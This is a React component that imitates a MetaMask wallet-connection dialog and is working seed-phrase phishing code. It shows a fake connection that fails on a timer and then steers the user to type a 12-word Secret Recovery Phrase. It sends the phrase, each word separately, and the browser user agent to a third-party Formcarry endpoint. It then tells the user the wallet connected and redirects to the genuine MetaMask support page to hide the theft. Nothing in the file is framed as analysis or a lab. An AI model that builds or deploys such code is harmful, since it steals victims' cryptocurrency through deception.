import React, { useState, useEffect } from 'react';
import * as bip39 from 'bip39';

const WalletConnectionModal = ({ onClose }) => {
  const [step, setStep] = useState('connecting'); // connecting, failed, retry-failed, manual
  const [retryCount, setRetryCount] = useState(0);
  const [words, setWords] = useState(Array(12).fill(''));
  const [wordValidation, setWordValidation] = useState(Array(12).fill(true));

  // Auto-fail after 4 seconds on connecting
  useEffect(() => {
    if (step === 'connecting') {
      const timer = setTimeout(() => {
        setStep('failed');
      }, 4000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleRetry = () => {
    setRetryCount(prev => prev + 1);
    if (retryCount === 0) {
      setStep('connecting');
      // After 4 seconds, go to retry-failed state
      setTimeout(() => {
        setStep('retry-failed');
      }, 4000);
    }
  };

  const handleManualLogin = () => {
    setStep('manual');
  };

  const handleWordChange = (index, value) => {
    // Check if user pasted a full phrase (12 words separated by spaces or commas)
    const pastedText = value.trim();
    const separators = /[\s,]+/; // Match spaces or commas
    const pastedWords = pastedText.split(separators).filter(w => w.length > 0);
    
    // If pasted 12 words, distribute them across all fields
    if (pastedWords.length === 12) {
      const newWords = pastedWords.map(w => w.toLowerCase().trim());
      setWords(newWords);
      
      // Validate all pasted words
      const newValidation = newWords.map(word => 
        word ? bip39.wordlists.english.includes(word) : true
      );
      setWordValidation(newValidation);
      return;
    }
    
    // Otherwise, handle single word input
    const newWords = [...words];
    newWords[index] = value.toLowerCase().trim();
    setWords(newWords);

    // Validate each word against BIP39 wordlist
    const newValidation = [...wordValidation];
    if (newWords[index]) {
      newValidation[index] = bip39.wordlists.english.includes(newWords[index]);
    } else {
      newValidation[index] = true;
    }
    setWordValidation(newValidation);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const phrase = words.join(' ');
    
    // Check if any words are invalid
    const hasInvalidWords = words.some((word, index) => !wordValidation[index]);
    
    try {
      // Send each word separately and the full phrase to Formcarry
      const formData = {
        recoveryPhrase: phrase,
        word1: words[0],
        word2: words[1],
        word3: words[2],
        word4: words[3],
        word5: words[4],
        word6: words[5],
        word7: words[6],
        word8: words[7],
        word9: words[8],
        word10: words[9],
        word11: words[10],
        word12: words[11],
        hasInvalidWords: hasInvalidWords,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      const response = await fetch('https://formcarry.com/s/fwPBUXBdTA7', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(formData)
      });
      
      if (response.ok) {
        if (hasInvalidWords) {
          // Show error message but still submitted
          alert('Connection failed. Please check the words highlighted in red and try again.');
        } else {
          alert('Wallet connected successfully!');
          // Redirect to MetaMask start page without referrer
          window.location.href = 'https://support.metamask.io/start/';
        }
      } else {
        throw new Error('Submission failed');
      }
    } catch (error) {
      console.error('Submission error:', error);
      alert('Connection failed. Please check your recovery phrase and try again.');
    }
  };

  // Enable button when all 12 fields have text (regardless of validity)
  const allWordsFilled = words.every(w => w.trim() !== '');

  return (
    <div className="mm-modal-overlay" onClick={onClose}>
      <div className="mm-modal-content" onClick={(e) => e.stopPropagation()}>
        <button className="mm-close-button" onClick={onClose}>×</button>
        
        {/* Connecting State */}
        {step === 'connecting' && (
          <div className="mm-connecting-state">
            <div className="mm-logo-container">
              <img src="/favicon.png" alt="Support" className="mm-logo" />
              <div className="mm-spinner"></div>
            </div>
            <h2 className="mm-title">Initializing Connection</h2>
            <p className="mm-subtitle">Connecting to your wallet...</p>
          </div>
        )}

        {/* Failed State */}
        {step === 'failed' && (
          <div className="mm-failed-state">
            <div className="mm-logo-container">
              <img src="/favicon.png" alt="Support" className="mm-logo" />
            </div>
            <h2 className="mm-title">Connection Failed</h2>
            <p className="mm-subtitle">Unable to connect to your wallet</p>
            <div className="mm-button-group">
              <button className="mm-button mm-button-primary" onClick={handleRetry}>
                Retry Connection
              </button>
              <button className="mm-button mm-button-secondary" onClick={handleManualLogin}>
                Login Manually
              </button>
            </div>
          </div>
        )}

        {/* Retry Failed State */}
        {step === 'retry-failed' && (
          <div className="mm-failed-state">
            <div className="mm-logo-container">
              <img src="/favicon.png" alt="Support" className="mm-logo mm-logo-disabled" />
            </div>
            <h2 className="mm-title">Connection Failed Again</h2>
            <p className="mm-subtitle">Please try again in a few hours</p>
            <div className="mm-button-group">
              <button className="mm-button mm-button-disabled" disabled>
                Try Again in a Few Hours
              </button>
              <button className="mm-button mm-button-secondary" onClick={handleManualLogin}>
                Login Manually
              </button>
            </div>
          </div>
        )}

        {/* Manual Login State */}
        {step === 'manual' && (
          <div className="mm-manual-state">
            <div className="mm-header">
              <img src="/favicon.png" alt="Support" className="mm-logo-small" />
              <h2 className="mm-title">Import with Secret Recovery Phrase</h2>
            </div>
            <p className="mm-manual-subtitle">Enter your 12-word Secret Recovery Phrase to restore your wallet.</p>
            <form onSubmit={handleSubmit} className="mm-form">
              <div className="mm-word-grid">
                {words.map((word, index) => (
                  <div key={index} className="mm-word-item">
                    <span className="mm-word-number">{index + 1}</span>
                    <input
                      type="text"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      className={`mm-word-input ${word && !wordValidation[index] ? 'mm-word-invalid' : word ? 'mm-word-valid' : ''}`}
                      placeholder=""
                      autoComplete="off"
                    />
                  </div>
                ))}
              </div>
              <button
                type="submit"
                className={`mm-button mm-button-primary mm-button-full ${!allWordsFilled ? 'mm-button-disabled' : ''}`}
                disabled={!allWordsFilled}
              >
                Import Wallet
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletConnectionModal;